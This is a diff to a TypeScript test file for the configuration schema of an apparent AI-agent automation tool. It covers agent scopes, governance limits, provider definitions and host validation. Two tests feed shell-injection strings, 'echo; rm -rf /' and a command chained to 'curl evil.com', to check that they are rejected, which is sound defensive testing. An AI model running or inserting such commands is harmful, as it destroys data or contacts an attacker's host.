@@ -37,18 +37,202 @@ describe('ConfigSchema', () => {
     const result = ConfigSchema.safeParse(validConfig);
     if (result.success) {
       expect(result.data.pollIntervalMs).toBe(30000);
+      expect(result.data.classifierBatchSize).toBe(10);
+      expect(result.data.governance).toEqual({
+        documentPath: 'FACTORY_RULES.md',
+        maxPrLinesChanged: 2000,
+      });
+      expect(result.data.agentScopes).toEqual({});
+      expect(result.data.runtimeSource).toEqual({
+        enabled: true,
+        requireClean: true,
+        requireExpectedRef: true,
+        allowSelfRepair: false,
+        onUnhealthy: 'pause',
+        ignoredDirtyPaths: ['state/', 'workspaces/', '.claude/scheduled_tasks.lock'],
+      });
+    }
+  });
+
+  it('accepts runtime source policy overrides', () => {
+    const result = ConfigSchema.safeParse({
+      ...validConfig,
+      runtimeSource: {
+        enabled: true,
+        sourceRoot: '/srv/auto-claude/runtime',
+        expectedRef: 'origin/dev',
+        requireClean: false,
+        requireExpectedRef: true,
+        allowSelfRepair: true,
+        onUnhealthy: 'warn',
+        ignoredDirtyPaths: ['state/', 'logs/'],
+      },
+    });
+
+    expect(result.success).toBe(true);
+    if (result.success) {
+      expect(result.data.runtimeSource.expectedRef).toBe('origin/dev');
+      expect(result.data.runtimeSource.onUnhealthy).toBe('warn');
+    }
+  });
+
+  it('accepts directory scope overrides per agent type', () => {
+    const result = ConfigSchema.safeParse({
+      ...validConfig,
+      agentScopes: {
+        worker: {
+          readPaths: ['src/**'],
+          writePaths: ['src/generated/**'],
+          denyPaths: ['src/generated/private/**'],
+        },
+      },
+    });
+
+    expect(result.success).toBe(true);
+    if (result.success) {
+      expect(result.data.agentScopes.worker?.writePaths).toEqual([
+        'src/generated/**',
+      ]);
+    }
+  });
+
+  it('accepts governance guardrail overrides', () => {
+    const result = ConfigSchema.safeParse({
+      ...validConfig,
+      governance: {
+        documentPath: '.auto-claude/FACTORY_RULES.md',
+        maxPrLinesChanged: 750,
+      },
+    });
+
+    expect(result.success).toBe(true);
+    if (result.success) {
+      expect(result.data.governance.maxPrLinesChanged).toBe(750);
+    }
+  });
+
+  it('accepts classifier batch size override', () => {
+    const result = ConfigSchema.safeParse({
+      ...validConfig,
+      classifierBatchSize: 25,
+    });
+
+    expect(result.success).toBe(true);
+    if (result.success) {
+      expect(result.data.classifierBatchSize).toBe(25);
+    }
+  });
+
+  it('accepts multi-provider session runtime config (#480)', () => {
+    const result = ConfigSchema.safeParse({
+      ...validConfig,
+      providers: {
+        defaultProvider: 'claude-default',
+        fallbackChain: ['codex-planner'],
+        definitions: {
+          'claude-default': {
+            name: 'claude-default',
+            adapterClass: 'process-based',
+            providerKind: 'claude-cli',
+            supportedModelTiers: [
+              'standard-capability',
+              'higher-capability',
+            ],
+            cliTool: 'claude',
+          },
+          'codex-planner': {
+            name: 'codex-planner',
+            adapterClass: 'process-based',
+            providerKind: 'codex-cli',
+            supportedModelTiers: ['higher-capability'],
+            cliTool: 'codex',
+            model: 'gpt-5.5',
+            executionFlags: ['exec'],
+            required: false,
+          },
+        },
+      },
+    });
+
+    expect(result.success).toBe(true);
+    if (result.success) {
+      expect(result.data.providers?.defaultProvider).toBe('claude-default');
+      expect(result.data.providers?.definitions['codex-planner']?.model).toBe(
+        'gpt-5.5',
+      );
+    }
+  });
+
+  it('rejects provider fallback entries that are not registered (#480)', () => {
+    const result = ConfigSchema.safeParse({
+      ...validConfig,
+      providers: {
+        defaultProvider: 'claude-default',
+        fallbackChain: ['missing-provider'],
+        definitions: {
+          'claude-default': {
+            name: 'claude-default',
+            adapterClass: 'process-based',
+            providerKind: 'claude-cli',
+            supportedModelTiers: ['standard-capability'],
+          },
+        },
+      },
+    });
+
+    expect(result.success).toBe(false);
+  });
+
+  it('rejects invalid classifier batch size', () => {
+    expect(
+      ConfigSchema.safeParse({ ...validConfig, classifierBatchSize: 0 })
+        .success,
+    ).toBe(false);
+    expect(
+      ConfigSchema.safeParse({ ...validConfig, classifierBatchSize: 101 })
+        .success,
+    ).toBe(false);
+  });
+
+  it('accepts IPv4 controlHost values (#248)', () => {
+    expect(
+      ConfigSchema.safeParse({ ...validConfig, controlHost: '127.0.0.1' })
+        .success,
+    ).toBe(true);
+    expect(
+      ConfigSchema.safeParse({ ...validConfig, controlHost: '0.0.0.0' })
+        .success,
+    ).toBe(true);
+  });
+
+  it('rejects hostname controlHost values (#248)', () => {
+    for (const controlHost of [
+      'localhost',
+      'my-server.local',
+      'example.com',
+      '::1',
+    ]) {
+      const result = ConfigSchema.safeParse({ ...validConfig, controlHost });
+
+      expect(result.success).toBe(false);
     }
   });
 
   it('rejects invalid adapter', () => {
-    const result = ConfigSchema.safeParse({ ...validConfig, adapter: 'invalid' });
+    const result = ConfigSchema.safeParse({
+      ...validConfig,
+      adapter: 'invalid',
+    });
     expect(result.success).toBe(false);
   });
 
   it('rejects gate1Commands with shell injection characters', () => {
     const result = ConfigSchema.safeParse({
       ...validConfig,
-      validation: { ...validConfig.validation, gate1Commands: ['echo; rm -rf /'] },
+      validation: {
+        ...validConfig.validation,
+        gate1Commands: ['echo; rm -rf /'],
+      },
     });
     expect(result.success).toBe(false);
   });
@@ -56,7 +240,10 @@ describe('ConfigSchema', () => {
   it('rejects holdoutCommand with shell injection characters', () => {
     const result = ConfigSchema.safeParse({
       ...validConfig,
-      validation: { ...validConfig.validation, holdoutCommand: './run.sh && curl evil.com' },
+      validation: {
+        ...validConfig.validation,
+        holdoutCommand: './run.sh && curl evil.com',
+      },
     });
     expect(result.success).toBe(false);
   });
@@ -89,13 +276,21 @@ describe('zod v4 compatibility', () => {
 
   it('applies nested defaults when outer object is omitted', () => {
     // Regression: zod v4 requires explicit default values for .default()
-    const result = ConfigSchema.safeParse({ dailyBudget: 50, perRunBudget: 10 });
+    const result = ConfigSchema.safeParse({
+      dailyBudget: 50,
+      perRunBudget: 10,
+    });
     expect(result.success).toBe(true);
     if (result.success) {
-      expect(result.data.branches).toEqual({ staging: 'staging', production: 'main' });
+      expect(result.data.branches).toEqual({
+        staging: 'staging',
+        production: 'main',
+      });
       expect(result.data.validation.maxFixCycles).toBe(3);
       expect(result.data.diagnosis.confidenceThreshold).toBe(0.7);
       expect(result.data.warmup.threshold).toBe(10);
+      expect(result.data.governance.documentPath).toBe('FACTORY_RULES.md');
+      expect(result.data.agentScopes).toEqual({});
     }
   });
 });
